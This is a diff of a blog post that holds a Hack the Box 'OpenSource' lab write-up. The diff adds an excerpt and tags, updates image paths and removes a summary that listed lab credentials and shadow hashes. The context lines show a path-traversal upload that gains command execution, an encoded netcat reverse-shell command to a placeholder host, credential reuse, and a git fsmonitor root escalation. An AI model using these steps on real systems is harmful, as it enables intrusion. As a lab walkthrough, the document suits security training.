@@ -2,50 +2,25 @@
 title: "Hack the Box - Opensource"
 slug: "hack-the-box-opensource"
 date: "2024-03-14"
-excerpt: ""
+excerpt: "OpenSource is an easy difficulty linux machine that features a Python HTTP server listening on port 80. After downloading the web application's source code, a Git repository is identified. Viewing the previous commits on the repository reveals a Virtual Studio Code settings file that contains a set of credentials for user `dev01`. Analysis of the application source code reveals that it is vulnerable to unrestricted file uploading and Directory traversal attacks, which can be abused in order to overwrite `views.py` and obtain Remote Command Execution. Users can leverage the RCE to obtain a reverse shell inside a Docker container. The container network can be used to enumerate the host machine internally and identify a `Gitea` instance running on port 3000. The credentials that were identified earlier can be used to login to the `Gitea` instance and download a backup of `dev01` user's SSH keys. After connecting to the host system with SSH, `Pspy` can be used to identify a cron job that is running as `root` and searches for changes in a repository found in the home directory of user `dev01`. The Git configuration file can be edited by the low level user and the `fsmonitor` parameter can be leveraged to obtain a root shell."
 cover: "cover.png"
 tags:
-  - 
+  - Git
+  - RCE
+  - Pspy
+  - Docker
 ---
-
-## Summary
-### System Information
-```text
-IP: 10.129.176.203
-OS: Linux
-DNS: opensource.htb
-Hostname: opensource
-```
-### Credentials
-```text
-dev01:Soulless_Developer#2022
-```
-
-### Hashes
-```text
-root:$6$5sA85UVX$HupltM.bMqXkLc269pHDk1lryc4y5LV0FPMtT3x.yUdbe3mGziC8aUXWRQ2K3jX8mq5zItFAkAfDgPzH8EQ1C/:19072:0:99999:7:::
-dev01:$6$KxPkBXel$7cqEmnerc0RmIaUGVdGLXlbC61.2x5bY0DLC/j2VDHG3mAaqeWFfQiuHOXmQss91XNn0FybSdfl51vFfKuwRh/:19073:0:99999:7:::
-```
-
-## Enumeration
-### Ports
-```text
-PORT     STATE    SERVICE
-22/tcp   open     ssh
-80/tcp   open     http
-3000/tcp filtered ppp
-```
 
 ## Writeup
 ### Foothold
 
 Download button on website gives you files for the website's source.
 
-![Root Website](./evidence/screenshots/root_website.png)
+![Root Website](./root_website.png)
 
 Downloaded app files contain two branches, `dev` and `public`.
 
-![Git Branches](./evidence/screenshots/git_branches.png)
+![Git Branches](./git_branches.png)
 
 Dev branch has a file difference of `settings.json` containing credentials for a proxy.
 ```json
@@ -64,11 +39,11 @@ git log dev --oneline
 git show a76f8f7
 ```
 
-![Git Difference](./evidence/screenshots/git_diff.png)
+![Git Difference](./git_diff.png)
 
 There's an upload file endpoint `/upcloud`.
 
-![Upload Website](./evidence/screenshots/upload_website.png)
+![Upload Website](./upload_website.png)
 
 Looking at the code in the `/app/app/views.py` we can identify a vulnerability in the way the file is saved on the target via the file name.
 
@@ -105,13 +80,13 @@ This will give us a new directory `/exec` with the `cmd` parameter where we can 
 
 Let's upload the new `views.py` file and intercept the request in Burp Suite.
 
-![Modify Upload Request](./evidence/screenshots/modify_upload_request.png)
+![Modify Upload Request](./modify_upload_request.png)
 
 The `..//` stops the `get_file_name` function from replacing the `../` preventing this attack from working.
 
 We should see the following indicating the file was successfully uploaded.
 
-![Upload Success](./evidence/screenshots/upload_success.png)
+![Upload Success](./upload_success.png)
 
 Now we should be able to access the `/exec` directory and execute commands via the `cmd` parameter.
 
@@ -132,19 +107,19 @@ rlwrap nc -lnvp 9001
 curl http://opensource.htb/exec?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20<LHOST>%20<LPORT>%20%3E%2Ftmp%2Ff
 ```
 
-![Foothold Shell](./evidence/screenshots/foothold_shell.png)
+![Foothold Shell](./foothold_shell.png)
 
 ### Docker Escape
 
 It looks like we have root already, but it's just because we are inside a Docker container.
 
-![List Docker](./evidence/screenshots/list_docker.png)
+![List Docker](./list_docker.png)
 
 If you can recall, there were 3 ports which showed up in our `nmap` scan, 1 of which was filtered. Let's try checking to see if this port is present in our target network.
 
 If we look at the network interfaces present on our container, we can find the gateway running on `172.17.0.1`.
 
-![Docker Interfaces](./evidence/screenshots/docker_interfaces.png)
+![Docker Interfaces](./docker_interfaces.png)
 
 We can try using `wget` to check port `3000` and see if there's anything.
 
@@ -154,11 +129,11 @@ wget http://172.17.0.1:3000
 
 From the response, it looks like there is a website running. And we can `head` the file to try and determine what the website is.
 
-![WGet Port](./evidence/screenshots/wget_port.png)
+![WGet Port](./wget_port.png)
 
 Looks like the website is actually a [Gitea](https://gitea.io/en-us/) instance.
 
-![Head Index](./evidence/screenshots/head_index.png)
+![Head Index](./head_index.png)
 
 Let's use `Chisel` and forward port `3000` to our local machine so we can enumerate more.
 
@@ -194,13 +169,13 @@ chmod +x chisel
 
 We can now visit `http://localhost:3000` and view the Gitea site hosted on `172.17.0.1`.
 
-![Gitea Website](./evidence/screenshots/gitea_website.png)
+![Gitea Website](./gitea_website.png)
 
 Let's try logging in using the credentials we found earlier in the `settings.json` file.
 
 Looks like it worked.
 
-![Gitea Dashboard](./evidence/screenshots/gitea_dashboard.png)
+![Gitea Dashboard](./gitea_dashboard.png)
 
 If we visit the `dev01/home-backup` repository we find a `.ssh` folder with an `id_rsa` private key. We can now use this to login to the host of the Docker container.
 
@@ -209,7 +184,7 @@ chmod 600 id_rsa
 ssh -i id_rsa dev01@opensource.htb
 ```
 
-![Host SSH](./evidence/screenshots/host_ssh.png)
+![Host SSH](./host_ssh.png)
 
 ### Privilege Escalation
 
@@ -312,4 +287,4 @@ Now we wait for the `cron` job to be run and execute our payload.
 
 And we get `root`!
 
-![Root](./evidence/screenshots/root.png)
+![Root](./root.png)
